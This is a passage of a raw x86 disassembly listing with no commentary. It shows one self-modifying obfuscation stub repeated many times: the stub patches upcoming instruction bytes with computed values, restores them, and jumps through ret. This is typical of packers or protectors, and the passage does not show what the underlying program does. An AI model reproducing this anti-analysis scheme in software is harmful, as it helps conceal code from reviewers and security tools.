  40c6dd:	8d 80 d3 17 19 ff    	lea    -0xe6e82d(%eax),%eax
  40c6e3:	87 05 ec c6 40 00    	xchg   %eax,0x40c6ec
  40c6e9:	58                   	pop    %eax
  40c6ea:	f3 90                	pause
  40c6ec:	84 9c 57 cf ff 50 66 	test   %bl,0x6650ffcf(%edi,%edx,2)
  40c6f3:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c6f8:	05 ec c6 40 00       	add    $0x40c6ec,%eax
  40c6fd:	b8 ff 95 f2 2b       	mov    $0x2bf295ff,%eax
  40c702:	87 04 24             	xchg   %eax,(%esp)
  40c705:	c3                   	ret
  40c706:	8f 05 35 c7 40 00    	pop    0x40c735
  40c70c:	50                   	push   %eax
  40c70d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c713:	8d 80 ea 05 f8 51    	lea    0x51f805ea(%eax),%eax
  40c719:	87 05 22 c7 40 00    	xchg   %eax,0x40c722
  40c71f:	58                   	pop    %eax
  40c720:	f3 90                	pause
  40c722:	2d f5 14 06 40       	sub    $0x400614f5,%eax
  40c727:	00 50 66             	add    %dl,0x66(%eax)
  40c72a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c72f:	05 22 c7 40 00       	add    $0x40c722,%eax
  40c734:	b8 b6 74 09 8d       	mov    $0x8d0974b6,%eax
  40c739:	8d 40 01             	lea    0x1(%eax),%eax
  40c73c:	87 04 24             	xchg   %eax,(%esp)
  40c73f:	c3                   	ret
  40c740:	8f 05 6e c7 40 00    	pop    0x40c76e
  40c746:	50                   	push   %eax
  40c747:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c74d:	8d 80 53 e1 bf ff    	lea    -0x401ead(%eax),%eax
  40c753:	87 05 5c c7 40 00    	xchg   %eax,0x40c75c
  40c759:	58                   	pop    %eax
  40c75a:	f3 90                	pause
  40c75c:	94                   	xchg   %eax,%esp
  40c75d:	a9 6c 0f 00 50       	test   $0x50000f6c,%eax
  40c762:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c766:	66 87 05 5c c7 40 00 	xchg   %ax,0x40c75c
  40c76d:	b8 de bc 1e f9       	mov    $0xf91ebcde,%eax
  40c772:	87 04 24             	xchg   %eax,(%esp)
  40c775:	c3                   	ret
  40c776:	8f 05 a4 c7 40 00    	pop    0x40c7a4
  40c77c:	50                   	push   %eax
  40c77d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c783:	8d 80 53 02 10 40    	lea    0x40100253(%eax),%eax
  40c789:	87 05 92 c7 40 00    	xchg   %eax,0x40c792
  40c78f:	58                   	pop    %eax
  40c790:	f3 90                	pause
  40c792:	fc                   	cld
  40c793:	c9                   	leave
  40c794:	86 d6                	xchg   %dl,%dh
  40c796:	00 50 66             	add    %dl,0x66(%eax)
  40c799:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c79e:	05 92 c7 40 00       	add    $0x40c792,%eax
  40c7a3:	b8 91 3a 64 6a       	mov    $0x6a643a91,%eax
  40c7a8:	87 04 24             	xchg   %eax,(%esp)
  40c7ab:	c3                   	ret
  40c7ac:	8f 05 da c7 40 00    	pop    0x40c7da
  40c7b2:	50                   	push   %eax
  40c7b3:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c7b9:	8d 80 d3 fd 08 ff    	lea    -0xf7022d(%eax),%eax
  40c7bf:	87 05 c8 c7 40 00    	xchg   %eax,0x40c7c8
  40c7c5:	58                   	pop    %eax
  40c7c6:	f3 90                	pause
  40c7c8:	4f                   	dec    %edi
  40c7c9:	8b 8b 60 ff 50 66    	mov    0x6650ff60(%ebx),%ecx
  40c7cf:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c7d4:	05 c8 c7 40 00       	add    $0x40c7c8,%eax
  40c7d9:	b8 7d 30 d5 9d       	mov    $0x9dd5307d,%eax
  40c7de:	87 04 24             	xchg   %eax,(%esp)
  40c7e1:	c3                   	ret
  40c7e2:	8f 05 10 c8 40 00    	pop    0x40c810
  40c7e8:	50                   	push   %eax
  40c7e9:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c7ef:	8d 80 d3 dd 17 ff    	lea    -0xe8222d(%eax),%eax
  40c7f5:	87 05 fe c7 40 00    	xchg   %eax,0x40c7fe
  40c7fb:	58                   	pop    %eax
  40c7fc:	f3 90                	pause
  40c7fe:	ea ae da 9d ff 50 66 	ljmp   $0x6650,$0xff9ddaae
  40c805:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c80a:	05 fe c7 40 00       	add    $0x40c7fe,%eax
  40c80f:	b8 56 73 2d 82       	mov    $0x822d7356,%eax
  40c814:	87 04 24             	xchg   %eax,(%esp)
  40c817:	c3                   	ret
  40c818:	8f 05 46 c8 40 00    	pop    0x40c846
  40c81e:	50                   	push   %eax
  40c81f:	90                   	nop
  40c820:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c825:	8d 80 d3 17 2f ff    	lea    -0xd0e82d(%eax),%eax
  40c82b:	87 05 34 c8 40 00    	xchg   %eax,0x40c834
  40c831:	58                   	pop    %eax
  40c832:	f3 90                	pause
  40c834:	73 4a                	jae    0x40c880
  40c836:	1f                   	pop    %ds
  40c837:	41                   	inc    %ecx
  40c838:	ff 50 66             	call   *0x66(%eax)
  40c83b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c840:	05 34 c8 40 00       	add    $0x40c834,%eax
  40c845:	b8 41 b3 2b 0e       	mov    $0xe2bb341,%eax
  40c84a:	87 04 24             	xchg   %eax,(%esp)
  40c84d:	c3                   	ret
  40c84e:	8f 05 7c c8 40 00    	pop    0x40c87c
  40c854:	50                   	push   %eax
  40c855:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c85b:	8d 80 d3 eb 30 ff    	lea    -0xcf142d(%eax),%eax
  40c861:	87 05 6a c8 40 00    	xchg   %eax,0x40c86a
  40c867:	58                   	pop    %eax
  40c868:	f3 90                	pause
  40c86a:	cb                   	lret
  40c86b:	99                   	cltd
  40c86c:	1f                   	pop    %ds
  40c86d:	ae                   	scas   %es:(%edi),%al
  40c86e:	ff 50 66             	call   *0x66(%eax)
  40c871:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c876:	05 6a c8 40 00       	add    $0x40c86a,%eax
  40c87b:	b8 73 34 4e de       	mov    $0xde4e3473,%eax
  40c880:	87 04 24             	xchg   %eax,(%esp)
  40c883:	c3                   	ret
  40c884:	8f 05 b3 c8 40 00    	pop    0x40c8b3
  40c88a:	50                   	push   %eax
  40c88b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c891:	8d 80 76 f5 5f 57    	lea    0x575ff576(%eax),%eax
  40c897:	87 05 a0 c8 40 00    	xchg   %eax,0x40c8a0
  40c89d:	58                   	pop    %eax
  40c89e:	f3 90                	pause
  40c8a0:	3d 25 93 ca 40       	cmp    $0x40ca9325,%eax
  40c8a5:	00 50 66             	add    %dl,0x66(%eax)
  40c8a8:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c8ad:	05 a0 c8 40 00       	add    $0x40c8a0,%eax
  40c8b2:	b8 f5 ea 39 b4       	mov    $0xb439eaf5,%eax
  40c8b7:	8d 40 01             	lea    0x1(%eax),%eax
  40c8ba:	87 04 24             	xchg   %eax,(%esp)
  40c8bd:	c3                   	ret
  40c8be:	8f 05 ed c8 40 00    	pop    0x40c8ed
  40c8c4:	50                   	push   %eax
  40c8c5:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c8cb:	8d 80 ea f5 03 52    	lea    0x5203f5ea(%eax),%eax
  40c8d1:	87 05 da c8 40 00    	xchg   %eax,0x40c8da
  40c8d7:	58                   	pop    %eax
  40c8d8:	f3 90                	pause
  40c8da:	4a                   	dec    %edx
  40c8db:	43                   	inc    %ebx
  40c8dc:	d8 cd                	fmul   %st(5),%st
  40c8de:	40                   	inc    %eax
  40c8df:	00 50 66             	add    %dl,0x66(%eax)
  40c8e2:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c8e7:	05 da c8 40 00       	add    $0x40c8da,%eax
  40c8ec:	b8 45 11 f8 91       	mov    $0x91f81145,%eax
  40c8f1:	8d 40 01             	lea    0x1(%eax),%eax
  40c8f4:	87 04 24             	xchg   %eax,(%esp)
  40c8f7:	c3                   	ret
  40c8f8:	8f 05 26 c9 40 00    	pop    0x40c926
  40c8fe:	50                   	push   %eax
  40c8ff:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c905:	8d 80 d3 d7 2f ff    	lea    -0xd0282d(%eax),%eax
  40c90b:	87 05 14 c9 40 00    	xchg   %eax,0x40c914
  40c911:	58                   	pop    %eax
  40c912:	f3 90                	pause
  40c914:	dd aa f5 72 ff 50    	(bad) 0x50ff72f5(%edx)
  40c91a:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c91e:	66 87 05 14 c9 40 00 	xchg   %ax,0x40c914
  40c925:	b8 8e 8e 24 13       	mov    $0x13248e8e,%eax
  40c92a:	87 04 24             	xchg   %eax,(%esp)
  40c92d:	c3                   	ret
  40c92e:	8f 05 5c c9 40 00    	pop    0x40c95c
  40c934:	50                   	push   %eax
  40c935:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c93b:	8d 80 53 05 10 40    	lea    0x40100553(%eax),%eax
  40c941:	87 05 4a c9 40 00    	xchg   %eax,0x40c94a
  40c947:	58                   	pop    %eax
  40c948:	f3 90                	pause
  40c94a:	c3                   	ret
  40c94b:	28 ed                	sub    %ch,%ch
  40c94d:	2c 00                	sub    $0x0,%al
  40c94f:	50                   	push   %eax
  40c950:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c954:	66 87 05 4a c9 40 00 	xchg   %ax,0x40c94a
  40c95b:	b8 94 cf 67 33       	mov    $0x3367cf94,%eax
  40c960:	87 04 24             	xchg   %eax,(%esp)
  40c963:	c3                   	ret
  40c964:	8f 05 92 c9 40 00    	pop    0x40c992
  40c96a:	50                   	push   %eax
  40c96b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c971:	8d 80 53 df bf ff    	lea    -0x4020ad(%eax),%eax
  40c977:	87 05 80 c9 40 00    	xchg   %eax,0x40c980
  40c97d:	58                   	pop    %eax
  40c97e:	f3 90                	pause
  40c980:	34 70                	xor    $0x70,%al
  40c982:	bf 38 ff 50 66       	mov    $0x6650ff38,%edi
  40c987:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c98c:	05 80 c9 40 00       	add    $0x40c980,%eax
  40c991:	b8 77 70 25 99       	mov    $0x99257077,%eax
  40c996:	87 04 24             	xchg   %eax,(%esp)
  40c999:	c3                   	ret
  40c99a:	8f 05 c8 c9 40 00    	pop    0x40c9c8
  40c9a0:	50                   	push   %eax
  40c9a1:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c9a7:	8d 80 d3 71 28 ff    	lea    -0xd78e2d(%eax),%eax
  40c9ad:	87 05 b6 c9 40 00    	xchg   %eax,0x40c9b6
  40c9b3:	58                   	pop    %eax
  40c9b4:	f3 90                	pause
  40c9b6:	9c                   	pushf
  40c9b7:	59                   	pop    %ecx
  40c9b8:	24 30                	and    $0x30,%al
  40c9ba:	ff 50 66             	call   *0x66(%eax)
  40c9bd:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c9c2:	05 b6 c9 40 00       	add    $0x40c9b6,%eax
  40c9c7:	b8 4d 7e d0 9d       	mov    $0x9dd07e4d,%eax
  40c9cc:	87 04 24             	xchg   %eax,(%esp)
  40c9cf:	c3                   	ret
  40c9d0:	8f 05 ff c9 40 00    	pop    0x40c9ff
  40c9d6:	50                   	push   %eax
  40c9d7:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c9dd:	8d 80 6c cc c8 00    	lea    0xc8cc6c(%eax),%eax
  40c9e3:	87 05 ec c9 40 00    	xchg   %eax,0x40c9ec
  40c9e9:	58                   	pop    %eax
  40c9ea:	f3 90                	pause
  40c9ec:	89 18                	mov    %ebx,(%eax)
  40c9ee:	f8                   	clc
  40c9ef:	a1 00 00 50 66       	mov    0x66500000,%eax
  40c9f4:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c9f9:	05 ec c9 40 00       	add    $0x40c9ec,%eax
  40c9fe:	b8 67 01 75 43       	mov    $0x43750167,%eax
  40ca03:	8d 40 01             	lea    0x1(%eax),%eax
  40ca06:	87 04 24             	xchg   %eax,(%esp)
  40ca09:	c3                   	ret
  40ca0a:	8f 05 39 ca 40 00    	pop    0x40ca39
  40ca10:	50                   	push   %eax
  40ca11:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ca17:	8d 80 24 fd 2f 57    	lea    0x572ffd24(%eax),%eax
  40ca1d:	87 05 26 ca 40 00    	xchg   %eax,0x40ca26
  40ca23:	58                   	pop    %eax
  40ca24:	f3 90                	pause
  40ca26:	92                   	xchg   %eax,%edx
  40ca27:	38 54 07 40          	cmp    %dl,0x40(%edi,%eax,1)
  40ca2b:	00 50 66             	add    %dl,0x66(%eax)
  40ca2e:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40ca33:	05 26 ca 40 00       	add    $0x40ca26,%eax
  40ca38:	b8 74 31 4f 22       	mov    $0x224f3174,%eax
  40ca3d:	8d 40 01             	lea    0x1(%eax),%eax
  40ca40:	87 04 24             	xchg   %eax,(%esp)
  40ca43:	c3                   	ret
  40ca44:	8f 05 72 ca 40 00    	pop    0x40ca72
  40ca4a:	50                   	push   %eax
  40ca4b:	90                   	nop
  40ca4c:	b8 15 20 40 00       	mov    $0x402015,%eax
  40ca51:	8d 80 53 e4 c0 ff    	lea    -0x3f1bad(%eax),%eax
  40ca57:	87 05 60 ca 40 00    	xchg   %eax,0x40ca60
  40ca5d:	58                   	pop    %eax
  40ca5e:	f3 90                	pause
  40ca60:	6d                   	insl   (%dx),%es:(%edi)
  40ca61:	e3 7f                	jecxz  0x40cae2
  40ca63:	69 00 50 66 b8 eb    	imul   $0xebb86650,(%eax),%eax
  40ca69:	e8 66 87 05 60       	call   0x604651d4
  40ca6e:	ca 40 00             	lret   $0x40
  40ca71:	b8 bb 96 4e f9       	mov    $0xf94e96bb,%eax
  40ca76:	87 04 24             	xchg   %eax,(%esp)
  40ca79:	c3                   	ret
  40ca7a:	8f 05 a9 ca 40 00    	pop    0x40caa9
  40ca80:	50                   	push   %eax
  40ca81:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ca87:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  40ca8d:	87 05 96 ca 40 00    	xchg   %eax,0x40ca96
  40ca93:	58                   	pop    %eax
  40ca94:	f3 90                	pause
  40ca96:	d0 e8                	shr    $1,%al
  40ca98:	64 57                	fs push %edi
  40ca9a:	ff                   	(bad)
  40ca9b:	ff 50 66             	call   *0x66(%eax)
  40ca9e:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40caa3:	05 96 ca 40 00       	add    $0x40ca96,%eax
  40caa8:	b8 5e 91 32 53       	mov    $0x5332915e,%eax
  40caad:	8d 40 01             	lea    0x1(%eax),%eax
  40cab0:	87 04 24             	xchg   %eax,(%esp)
  40cab3:	c3                   	ret
  40cab4:	8f 05 e2 ca 40 00    	pop    0x40cae2
  40caba:	50                   	push   %eax
  40cabb:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cac1:	8d 80 d3 97 2e ff    	lea    -0xd1682d(%eax),%eax
  40cac7:	87 05 d0 ca 40 00    	xchg   %eax,0x40cad0
  40cacd:	58                   	pop    %eax
  40cace:	f3 90                	pause
  40cad0:	9d                   	popf
  40cad1:	5e                   	pop    %esi
  40cad2:	9e                   	sahf
  40cad3:	48                   	dec    %eax
  40cad4:	ff 50 66             	call   *0x66(%eax)
  40cad7:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cadc:	05 d0 ca 40 00       	add    $0x40cad0,%eax
  40cae1:	b8 9b cc e0 9f       	mov    $0x9fe0cc9b,%eax
  40cae6:	87 04 24             	xchg   %eax,(%esp)
  40cae9:	c3                   	ret
  40caea:	8f 05 18 cb 40 00    	pop    0x40cb18
  40caf0:	50                   	push   %eax
  40caf1:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40caf7:	8d 80 d3 4f 2e ff    	lea    -0xd1b02d(%eax),%eax
  40cafd:	87 05 06 cb 40 00    	xchg   %eax,0x40cb06
  40cb03:	58                   	pop    %eax
  40cb04:	f3 90                	pause
  40cb06:	a1 21 b9 5d ff       	mov    0xff5db921,%eax
  40cb0b:	50                   	push   %eax
  40cb0c:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40cb10:	66 87 05 06 cb 40 00 	xchg   %ax,0x40cb06
  40cb17:	b8 31 53 3a 50       	mov    $0x503a5331,%eax
  40cb1c:	87 04 24             	xchg   %eax,(%esp)
  40cb1f:	c3                   	ret
  40cb20:	8f 05 4e cb 40 00    	pop    0x40cb4e
  40cb26:	50                   	push   %eax
  40cb27:	90                   	nop
  40cb28:	b8 15 20 40 00       	mov    $0x402015,%eax
  40cb2d:	8d 80 a3 f8 ff 3f    	lea    0x3ffff8a3(%eax),%eax
  40cb33:	87 05 3c cb 40 00    	xchg   %eax,0x40cb3c
  40cb39:	58                   	pop    %eax
  40cb3a:	f3 90                	pause
  40cb3c:	32 c9                	xor    %cl,%cl
  40cb3e:	1b d1                	sbb    %ecx,%edx
  40cb40:	00 50 66             	add    %dl,0x66(%eax)
  40cb43:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cb48:	05 3c cb 40 00       	add    $0x40cb3c,%eax
  40cb4d:	b8 b5 6b 7b a9       	mov    $0xa97b6bb5,%eax
  40cb52:	87 04 24             	xchg   %eax,(%esp)
  40cb55:	c3                   	ret
  40cb56:	8f 05 85 cb 40 00    	pop    0x40cb85
  40cb5c:	50                   	push   %eax
  40cb5d:	90                   	nop
  40cb5e:	b8 15 20 40 00       	mov    $0x402015,%eax
  40cb63:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  40cb69:	87 05 72 cb 40 00    	xchg   %eax,0x40cb72
  40cb6f:	58                   	pop    %eax
  40cb70:	f3 90                	pause
  40cb72:	e8 11 8e 1b ff       	call   0xff5c5988
  40cb77:	ff 50 66             	call   *0x66(%eax)
  40cb7a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cb7f:	05 72 cb 40 00       	add    $0x40cb72,%eax
  40cb84:	b8 e0 8f 9b 1a       	mov    $0x1a9b8fe0,%eax
  40cb89:	8d 40 01             	lea    0x1(%eax),%eax
  40cb8c:	87 04 24             	xchg   %eax,(%esp)
  40cb8f:	c3                   	ret
  40cb90:	8f 05 be cb 40 00    	pop    0x40cbbe
  40cb96:	50                   	push   %eax
  40cb97:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cb9d:	8d 80 d3 b5 2d ff    	lea    -0xd24a2d(%eax),%eax
  40cba3:	87 05 ac cb 40 00    	xchg   %eax,0x40cbac
  40cba9:	58                   	pop    %eax
  40cbaa:	f3 90                	pause
  40cbac:	77 77                	ja     0x40cc25
  40cbae:	88 52 ff             	mov    %dl,-0x1(%edx)
  40cbb1:	50                   	push   %eax
  40cbb2:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40cbb6:	66 87 05 ac cb 40 00 	xchg   %ax,0x40cbac
  40cbbd:	b8 41 a9 06 5f       	mov    $0x5f06a941,%eax
  40cbc2:	87 04 24             	xchg   %eax,(%esp)
  40cbc5:	c3                   	ret
  40cbc6:	8f 05 f5 cb 40 00    	pop    0x40cbf5
  40cbcc:	50                   	push   %eax
  40cbcd:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cbd3:	8d 80 ea 15 30 57    	lea    0x573015ea(%eax),%eax
  40cbd9:	87 05 e2 cb 40 00    	xchg   %eax,0x40cbe2
  40cbdf:	58                   	pop    %eax
  40cbe0:	f3 90                	pause
  40cbe2:	23 d7                	and    %edi,%edx
  40cbe4:	cf                   	iret
  40cbe5:	9d                   	popf
  40cbe6:	40                   	inc    %eax
  40cbe7:	00 50 66             	add    %dl,0x66(%eax)
  40cbea:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cbef:	05 e2 cb 40 00       	add    $0x40cbe2,%eax
  40cbf4:	b8 62 de 30 dc       	mov    $0xdc30de62,%eax
  40cbf9:	8d 40 01             	lea    0x1(%eax),%eax
  40cbfc:	87 04 24             	xchg   %eax,(%esp)
  40cbff:	c3                   	ret
  40cc00:	8f 05 2e cc 40 00    	pop    0x40cc2e
  40cc06:	50                   	push   %eax
  40cc07:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cc0d:	8d 80 d3 56 27 ff    	lea    -0xd8a92d(%eax),%eax
  40cc13:	87 05 1c cc 40 00    	xchg   %eax,0x40cc1c
  40cc19:	58                   	pop    %eax
  40cc1a:	f3 90                	pause
  40cc1c:	41                   	inc    %ecx
  40cc1d:	98                   	cwtl
  40cc1e:	b2 34                	mov    $0x34,%dl
  40cc20:	ff 50 66             	call   *0x66(%eax)
  40cc23:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cc28:	05 1c cc 40 00       	add    $0x40cc1c,%eax
  40cc2d:	b8 8c b0 39 f1       	mov    $0xf139b08c,%eax
  40cc32:	87 04 24             	xchg   %eax,(%esp)
  40cc35:	c3                   	ret
  40cc36:	8f 05 65 cc 40 00    	pop    0x40cc65
  40cc3c:	50                   	push   %eax
  40cc3d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cc43:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  40cc49:	87 05 52 cc 40 00    	xchg   %eax,0x40cc52
  40cc4f:	58                   	pop    %eax
  40cc50:	f3 90                	pause
  40cc52:	5d                   	pop    %ebp
  40cc53:	06                   	push   %es
  40cc54:	0f 5a ff             	cvtps2pd %xmm7,%xmm7
  40cc57:	ff 50 66             	call   *0x66(%eax)
  40cc5a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cc5f:	05 52 cc 40 00       	add    $0x40cc52,%eax
  40cc64:	b8 87 db 53 02       	mov    $0x253db87,%eax
  40cc69:	8d 40 01             	lea    0x1(%eax),%eax
  40cc6c:	87 04 24             	xchg   %eax,(%esp)
  40cc6f:	c3                   	ret
  40cc70:	8f 05 9f cc 40 00    	pop    0x40cc9f
  40cc76:	50                   	push   %eax
  40cc77:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cc7d:	8d 80 ea f5 53 52    	lea    0x5253f5ea(%eax),%eax
  40cc83:	87 05 8c cc 40 00    	xchg   %eax,0x40cc8c
  40cc89:	58                   	pop    %eax
  40cc8a:	f3 90                	pause
  40cc8c:	26 fd                	es std
  40cc8e:	1e                   	push   %ds
  40cc8f:	7a 40                	jp     0x40ccd1
  40cc91:	00 50 66             	add    %dl,0x66(%eax)
  40cc94:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cc99:	05 8c cc 40 00       	add    $0x40cc8c,%eax
  40cc9e:	b8 96 88 b2 e6       	mov    $0xe6b28896,%eax
  40cca3:	8d 40 01             	lea    0x1(%eax),%eax
  40cca6:	87 04 24             	xchg   %eax,(%esp)
  40cca9:	c3                   	ret
  40ccaa:	8f 05 d9 cc 40 00    	pop    0x40ccd9
  40ccb0:	50                   	push   %eax
  40ccb1:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ccb7:	8d 80 ea f5 63 52    	lea    0x5263f5ea(%eax),%eax
  40ccbd:	87 05 c6 cc 40 00    	xchg   %eax,0x40ccc6
  40ccc3:	58                   	pop    %eax
  40ccc4:	f3 90                	pause
  40ccc6:	2b 7e 97             	sub    -0x69(%esi),%edi
  40ccc9:	46                   	inc    %esi
  40ccca:	40                   	inc    %eax
  40cccb:	00 50 66             	add    %dl,0x66(%eax)
  40ccce:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40ccd3:	05 c6 cc 40 00       	add    $0x40ccc6,%eax
  40ccd8:	b8 21 13 2b 4a       	mov    $0x4a2b1321,%eax
  40ccdd:	8d 40 01             	lea    0x1(%eax),%eax
  40cce0:	87 04 24             	xchg   %eax,(%esp)
  40cce3:	c3                   	ret
  40cce4:	8f 05 13 cd 40 00    	pop    0x40cd13
  40ccea:	50                   	push   %eax
  40cceb:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ccf1:	8d 80 ea 15 30 57    	lea    0x573015ea(%eax),%eax
  40ccf7:	87 05 00 cd 40 00    	xchg   %eax,0x40cd00
  40ccfd:	58                   	pop    %eax
  40ccfe:	f3 90                	pause
  40cd00:	fe                   	(bad)
  40cd01:	fd                   	std
  40cd02:	9e                   	sahf
  40cd03:	4c                   	dec    %esp
  40cd04:	40                   	inc    %eax
  40cd05:	00 50 66             	add    %dl,0x66(%eax)
  40cd08:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cd0d:	05 00 cd 40 00       	add    $0x40cd00,%eax
  40cd12:	b8 86 e9 0d 26       	mov    $0x260de986,%eax
  40cd17:	8d 40 01             	lea    0x1(%eax),%eax
  40cd1a:	87 04 24             	xchg   %eax,(%esp)
  40cd1d:	c3                   	ret
  40cd1e:	8f 05 4c cd 40 00    	pop    0x40cd4c
  40cd24:	50                   	push   %eax
  40cd25:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cd2b:	8d 80 d3 c7 26 ff    	lea    -0xd9382d(%eax),%eax
  40cd31:	87 05 3a cd 40 00    	xchg   %eax,0x40cd3a
  40cd37:	58                   	pop    %eax
  40cd38:	f3 90                	pause
  40cd3a:	cd a0                	int    $0xa0
  40cd3c:	78 ac                	js     0x40ccea
  40cd3e:	ff 50 66             	call   *0x66(%eax)
  40cd41:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cd46:	05 3a cd 40 00       	add    $0x40cd3a,%eax
  40cd4b:	b8 69 14 ff 2c       	mov    $0x2cff1469,%eax
  40cd50:	87 04 24             	xchg   %eax,(%esp)
  40cd53:	c3                   	ret
  40cd54:	8f 05 84 cd 40 00    	pop    0x40cd84
  40cd5a:	50                   	push   %eax
  40cd5b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cd61:	8d 80 b2 26 c4 00    	lea    0xc426b2(%eax),%eax
  40cd67:	87 05 70 cd 40 00    	xchg   %eax,0x40cd70
  40cd6d:	58                   	pop    %eax
  40cd6e:	f3 90                	pause
  40cd70:	90                   	nop
  40cd71:	6c                   	insb   (%dx),%es:(%edi)
  40cd72:	99                   	cltd
  40cd73:	41                   	inc    %ecx
  40cd74:	00 00                	add    %al,(%eax)
  40cd76:	00 50 66             	add    %dl,0x66(%eax)
  40cd79:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cd7e:	05 70 cd 40 00       	add    $0x40cd70,%eax
  40cd83:	b8 1f 0d 90 94       	mov    $0x94900d1f,%eax
  40cd88:	8d 40 02             	lea    0x2(%eax),%eax
  40cd8b:	87 04 24             	xchg   %eax,(%esp)
  40cd8e:	c3                   	ret
  40cd8f:	8f 05 bd cd 40 00    	pop    0x40cdbd
  40cd95:	50                   	push   %eax
  40cd96:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cd9c:	8d 80 6b 5c f0 fe    	lea    -0x10fa395(%eax),%eax
  40cda2:	87 05 ab cd 40 00    	xchg   %eax,0x40cdab
  40cda8:	58                   	pop    %eax
  40cda9:	f3 90                	pause
  40cdab:	bf b9 07 5c 5c       	mov    $0x5c5c07b9,%edi
  40cdb0:	50                   	push   %eax
  40cdb1:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40cdb5:	66 87 05 ab cd 40 00 	xchg   %ax,0x40cdab
  40cdbc:	b8 61 e4 15 3e       	mov    $0x3e15e461,%eax
  40cdc1:	87 04 24             	xchg   %eax,(%esp)
  40cdc4:	c3                   	ret
  40cdc5:	8f 05 f4 cd 40 00    	pop    0x40cdf4
  40cdcb:	50                   	push   %eax
  40cdcc:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cdd2:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  40cdd8:	87 05 e1 cd 40 00    	xchg   %eax,0x40cde1
  40cdde:	58                   	pop    %eax
  40cddf:	f3 90                	pause
  40cde1:	4c                   	dec    %esp
  40cde2:	42                   	inc    %edx
  40cde3:	9f                   	lahf
  40cde4:	c1 ff ff             	sar    $0xff,%edi
  40cde7:	50                   	push   %eax
  40cde8:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40cdec:	66 87 05 e1 cd 40 00 	xchg   %ax,0x40cde1
  40cdf3:	b8 32 bc 69 75       	mov    $0x7569bc32,%eax
  40cdf8:	8d 40 01             	lea    0x1(%eax),%eax
  40cdfb:	87 04 24             	xchg   %eax,(%esp)
  40cdfe:	c3                   	ret
  40cdff:	8f 05 2d ce 40 00    	pop    0x40ce2d
  40ce05:	50                   	push   %eax
  40ce06:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ce0c:	8d 80 53 f4 ff 3f    	lea    0x3ffff453(%eax),%eax
  40ce12:	87 05 1b ce 40 00    	xchg   %eax,0x40ce1b
  40ce18:	58                   	pop    %eax
  40ce19:	f3 90                	pause
  40ce1b:	bd f7 d7 bf 00       	mov    $0xbfd7f7,%ebp
  40ce20:	50                   	push   %eax
  40ce21:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40ce25:	66 87 05 1b ce 40 00 	xchg   %ax,0x40ce1b
  40ce2c:	b8 64 e1 38 fe       	mov    $0xfe38e164,%eax
  40ce31:	87 04 24             	xchg   %eax,(%esp)
  40ce34:	c3                   	ret
  40ce35:	8f 05 63 ce 40 00    	pop    0x40ce63
  40ce3b:	50                   	push   %eax
